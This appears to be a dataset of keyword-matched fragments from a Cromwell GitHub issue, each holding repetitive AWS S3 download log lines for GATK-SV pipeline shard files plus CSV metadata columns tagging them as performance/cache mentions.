focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz; 1608597473978,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:146270,cache,cacheCopy,146270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz.tbi; 1608597604365,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi; 1608597606470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597610071,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:184512,cache,cacheCopy,184512,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi; 1608597394986,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi; 1608597397902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz; 1608597399545,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:124423,cache,cacheCopy,124423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi; 1608596987867,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi; 1608596990438,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz; 1608596992645,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:14090,cache,cacheCopy,14090,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi; 1608597492748,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi; 1608597495158,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi; 1608597497211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:153732,cache,cacheCopy,153732,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi; 1608596972311,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi; 1608596974147,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi; 1608596976528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:9723,cache,cacheCopy,9723,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi; 1608597629983,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi; 1608597632017,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz; 1608597635134,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:191357,cache,cacheCopy,191357,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi; 1608597076382,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi; 1608597078723,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz; 1608597081079,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:37782,cache,cacheCopy,37782,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz; 1608597612565,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-0/cacheCopy/SR00c.NA12878.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-0/cacheCopy/SR00c.NA12878.txt.gz; 1608597615294,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz; 1608597617667,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:186700,cache,cacheCopy,186700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-49/cacheCopy/SR00c.HG02069.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-49/cacheCopy/SR00c.HG02069.txt.gz.tbi; 1608597569034,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz.tbi; 1608597571205,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz; 1608597573618,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:175814,cache,cacheCopy,175814,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi; 1608597495158,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi; 1608597497211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz; 1608597499938,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:154359,cache,cacheCopy,154359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi; 1608597491461,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi to 